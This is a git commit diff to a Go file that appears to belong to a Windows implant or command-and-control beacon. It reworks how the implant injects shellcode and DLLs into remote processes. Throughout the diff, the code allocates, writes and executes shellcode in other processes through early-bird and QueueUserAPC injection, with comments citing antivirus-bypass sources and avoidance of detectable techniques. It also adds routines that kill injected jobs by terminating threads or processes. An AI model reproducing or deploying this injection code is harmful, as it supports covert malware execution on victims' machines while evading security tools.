50a9774ca03d0da92ce7c293f2ba1f283747f62a
z3ratu1 <1207039417@qq.com>
2022-10-16 19:18:59 +0800

    update job.go

--- command/job_windows.go
+++ command/job_windows.go
@@ -5,7 +5,6 @@ import (
 	"errors"
 	"fmt"
 	"github.com/Microsoft/go-winio"
-	"github.com/shirou/gopsutil/v3/process"
 	"golang.org/x/sys/windows"
 	"io"
 	"main/config"
@@ -25,6 +24,7 @@ var (
 	virtualProtectEx        = kernel32.NewProc("VirtualProtectEx")
 	createRemoteThreadEx    = kernel32.NewProc("CreateRemoteThreadEx")
 	queueUserAPC            = kernel32.NewProc("QueueUserAPC")
+	terminateThread         = kernel32.NewProc("TerminateThread ")
 	rtlCopyMemory           = ntdll.NewProc("RtlCopyMemory")
 	createThread            = kernel32.NewProc("CreateThread")
 	createProcessWithLogonW = advapi32.NewProc("CreateProcessWithLogonW")
@@ -37,18 +37,20 @@ var (
 type job struct {
 	jid         int
 	pid         uint32
+	tid         uint32
+	isJobSpawn  bool
 	description string
 	pipeName    string
 	stopCh      chan bool
 }
 
 var jobs []job
-
-// there is no static var in golang
 var jobCnt = 0
 
-// init length to 1, or it will block until receiver receive message
-var pidChan = make(chan uint32, 1)
+// spawn and inject get thread/process id, but we need it in handleJob
+var currentPid uint32 = 0
+var currentTid uint32 = 0
+var isJobSpawn = true
 
 func removeJob(jid int) {
 	for i, job := range jobs {
@@ -67,12 +69,45 @@ func InjectDll(b []byte) error {
 	processHandle, err := windows.OpenProcess(windows.PROCESS_CREATE_THREAD|windows.PROCESS_VM_OPERATION|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_READ|windows.PROCESS_QUERY_INFORMATION, true, pid)
 	if err != nil {
 		// if you don't put a value into channel will cause blocking in handle job
-		pidChan <- 0
+		currentPid = 0
 		return errors.New(fmt.Sprintf("OpenProcess error: %s", err))
 	}
-	pidChan <- pid
-	// record job here
-	return createRemoteThread(processHandle, dll)
+	currentPid = pid
+	isJobSpawn = false
+	//return createRemoteThread(processHandle, dll)
+
+	// callUserAPC deploy
+	threadIds := listThread(pid)
+	threadHandle, err := windows.OpenThread(0, false, threadIds[0])
+	if err != nil {
+		// use currentPid = 0 to indicate error
+		currentPid = 0
+		return err
+	}
+	currentTid = threadIds[0]
+	defer windows.CloseHandle(threadHandle)
+	defer windows.CloseHandle(processHandle)
+	return callUserAPC(processHandle, threadHandle, dll)
+}
+
+func listThread(pid uint32) []uint32 {
+	snapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPTHREAD, pid)
+	if err != nil {
+		return nil
+	}
+	defer windows.CloseHandle(snapshot)
+	var te windows.ThreadEntry32
+	te.Size = uint32(unsafe.Sizeof(te))
+	err = windows.Thread32First(snapshot, &te)
+	var threadId []uint32
+	for err != windows.ERROR_NO_MORE_FILES {
+		if te.OwnerProcessID == pid {
+			threadId = append(threadId, te.ThreadID)
+			fmt.Println(te.ThreadID)
+		}
+		err = windows.Thread32Next(snapshot, &te)
+	}
+	return threadId
 }
 
 // you should ensure x86 shellcode inject to x86 process
@@ -136,44 +171,46 @@ func spawnAndInjectDll(dll []byte, program string, args string) error {
 	}
 	errCreateProcess := createProcessNative(windows.StringToUTF16Ptr(program), windows.StringToUTF16Ptr(args), nil, nil, true, windows.CREATE_SUSPENDED, nil, nil, startupInfo, procInfo)
 	if errCreateProcess != nil && errCreateProcess != windows.SEVERITY_SUCCESS {
-		pidChan <- 0
+		currentPid = 0
 		return errors.New(fmt.Sprintf("[!]Error calling CreateProcess:\r\n%s", errCreateProcess.Error()))
 	}
-	pidChan <- procInfo.ProcessId
-	return callUserAPC(procInfo, dll)
+	currentPid = procInfo.ProcessId
+	// kill spawn will kill process, so threadId is useless
+	currentTid = procInfo.ThreadId
+	isJobSpawn = true
+	defer windows.CloseHandle(procInfo.Process)
+	defer windows.CloseHandle(procInfo.Thread)
+	return callUserAPC(procInfo.Process, procInfo.Thread, dll)
 
 	// createRemoteThread can be easily caught, you should never use it
-	//return createRemoteThread(procInfo, dll)
+	//processHandle, _ := windows.OpenProcess(windows.PROCESS_CREATE_THREAD|windows.PROCESS_VM_OPERATION|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_READ|windows.PROCESS_QUERY_INFORMATION, true, procInfo.ProcessId)
+	//return createRemoteThread(processHandle, dll)
 }
 
 // copy from GolangBypassAV EarlyBird
-func callUserAPC(procInfo *windows.ProcessInformation, shellcode []byte) error {
-	addr, _, errVirtualAlloc := virtualAllocEx.Call(uintptr(procInfo.Process), 0, uintptr(len(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
+func callUserAPC(processHandle windows.Handle, threadHandle windows.Handle, shellcode []byte) error {
+	addr, _, errVirtualAlloc := virtualAllocEx.Call(uintptr(processHandle), 0, uintptr(len(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
 
 	if errVirtualAlloc != nil && errVirtualAlloc != windows.SEVERITY_SUCCESS {
 		return errors.New(fmt.Sprintf("VirtualAlloc error: %s", errVirtualAlloc))
 	}
 	var length uintptr
-	errWriteProcessMemory := windows.WriteProcessMemory(procInfo.Process, addr, &shellcode[0], uintptr(len(shellcode)), &length)
+	errWriteProcessMemory := windows.WriteProcessMemory(processHandle, addr, &shellcode[0], uintptr(len(shellcode)), &length)
 	if errWriteProcessMemory != nil {
 		return errors.New(fmt.Sprintf("WriteProcessMemory error: %s", errWriteProcessMemory))
 	}
 	oldProtect := windows.PAGE_READWRITE
-	_, _, errVirtualProtectEx := virtualProtectEx.Call(uintptr(procInfo.Process), addr, uintptr(len(shellcode)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
+	_, _, errVirtualProtectEx := virtualProtectEx.Call(uintptr(processHandle), addr, uintptr(len(shellcode)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
 	if errVirtualProtectEx != nil && errVirtualProtectEx != windows.SEVERITY_SUCCESS {
 		return errors.New(fmt.Sprintf("VirtualProtectEx error: %s", errVirtualProtectEx))
 	}
-	_, _, err := queueUserAPC.Call(addr, uintptr(procInfo.Thread), 0)
+	_, _, err := queueUserAPC.Call(addr, uintptr(threadHandle), 0)
 	if err != nil && errVirtualProtectEx != windows.SEVERITY_SUCCESS {
 		return errors.New(fmt.Sprintf("QueueUserAPC error: %s", err))
 	}
-	_, errResumeThread := windows.ResumeThread(procInfo.Thread)
+	_, errResumeThread := windows.ResumeThread(threadHandle)
 	if errResumeThread != nil {
 		return errors.New(fmt.Sprintf("ResumeThread error: %s", errResumeThread))
-	}
-	errCloseThreadHandle := windows.CloseHandle(procInfo.Thread)
-	if errCloseThreadHandle != nil {
-		return errors.New(fmt.Sprintf("CloseHandle error: %s", errCloseThreadHandle.Error()))
 	}
 	return nil
 }
@@ -200,16 +237,13 @@ func createRemoteThread(processHandle windows.Handle, shellcode []byte) error {
 	if errVirtualProtectEx != nil && errVirtualProtectEx != windows.SEVERITY_SUCCESS {
 		return errors.New(fmt.Sprintf("Error calling VirtualProtectEx: %s", errVirtualProtectEx))
 	}
-
-	_, _, errCreateRemoteThreadEx := createRemoteThreadEx.Call(uintptr(processHandle), 0, 0, addr, 0, 0, 0)
+	var threadId uint32
+	_, _, errCreateRemoteThreadEx := createRemoteThreadEx.Call(uintptr(processHandle), 0, 0, addr, 0, 0, uintptr(threadId))
 	if errCreateRemoteThreadEx != nil && errCreateRemoteThreadEx != windows.SEVERITY_SUCCESS {
 		return errors.New(fmt.Sprintf("[!]Error calling CreateRemoteThreadEx: %s", errCreateRemoteThreadEx))
 	}
-
-	errCloseHandle := windows.CloseHandle(processHandle)
-	if errCloseHandle != nil {
-		return errors.New(fmt.Sprintf("[!]Error calling CloseHandle: %s", errCloseHandle))
-	}
+	currentTid = threadId
+	_ = windows.CloseHandle(processHandle)
 	return nil
 }
 
@@ -226,19 +260,18 @@ func HandlerJobAsync(b []byte) error {
 	sleepTime := packet.ReadShort(sleepTimeByte)
 	pipeName, _ := parseAnArg(buf)
 	commandType, _ := parseAnArg(buf)
-	// I guess this is kind of sync
-	pid := <-pidChan
-	if pid == 0 {
+	if currentPid == 0 {
 		return nil
 	}
-	currentJid := jobCnt
 	stopCh := make(chan bool, 1)
 	j := job{
 		jid:         jobCnt,
-		pid:         pid,
+		pid:         currentPid,
+		tid:         currentTid,
 		description: string(commandType),
 		pipeName:    string(pipeName),
 		stopCh:      stopCh,
+		isJobSpawn:  isJobSpawn,
 	}
 	jobCnt++
 	jobs = append(jobs, j)
@@ -247,11 +280,15 @@ func HandlerJobAsync(b []byte) error {
 	go func() {
 		// sleep time some time is small, some time is huge, so set it to Microsecond
 		//fmt.Printf("Sleep time: %d\n", sleepTime)
-		time.Sleep(time.Microsecond * time.Duration(sleepTime))
+		if sleepTime < 10 {
+			time.Sleep(time.Second * time.Duration(sleepTime))
+		} else {
+			time.Sleep(time.Microsecond * time.Duration(sleepTime))
+		}
 		result, err := readNamedPipe(j)
 		if err != nil {
 			ErrorMessage(err.Error())
-			removeJob(currentJid)
+			removeJob(j.jid)
 			return
 		}
 
@@ -263,7 +300,7 @@ func HandlerJobAsync(b []byte) error {
 		}
 		finalPacket := packet.MakePacket(int(callbackType), []byte(result))
 		packet.PushResult(finalPacket)
-		removeJob(currentJid)
+		removeJob(j.jid)
 	}()
 	return nil
 }
@@ -283,18 +320,23 @@ func KillJob(b []byte) error {
 	for _, j := range jobs {
 		if j.jid == int(jid) {
 			j.stopCh <- true
-			processes, err := process.Processes()
-			if err != nil {
-				return err
-			}
-			for _, p := range processes {
-				if p.Pid == int32(j.pid) {
-					// TODO in case of inject, this would kill a normal process
-					removeJob(j.jid)
-					err = p.Kill()
-					if err != nil {
-						return err
-					}
+			if j.isJobSpawn {
+				processHandle, err := windows.OpenProcess(windows.PROCESS_TERMINATE, false, j.pid)
+				if err != nil {
+					return err
+				}
+				err = windows.TerminateProcess(processHandle, 0)
+				if err != nil {
+					return err
+				}
+			} else {
+				threadHandle, err := windows.OpenThread(windows.THREAD_TERMINATE, false, j.tid)
+				if err != nil {
+					return err
+				}
+				_, _, err = terminateThread.Call(uintptr(unsafe.Pointer(&threadHandle)), 0)
+				if err != nil {
+					return err
 				}
 			}
 		}
@@ -317,9 +359,10 @@ func readNamedPipe(j job) (string, error) {
 	for {
 		select {
 		case <-j.stopCh:
-			return "", errors.New("job canceled")
+			return "", errors.New(fmt.Sprintf("job %d canceled", j.jid))
 		default:
 			n, err := pipe.Read(buf)
+			// if you kill the process, pipe will be closed and there will receive an EOF
 			if err != nil {
 				if err != io.EOF && err != windows.ERROR_PIPE_NOT_CONNECTED {
 					return "", err
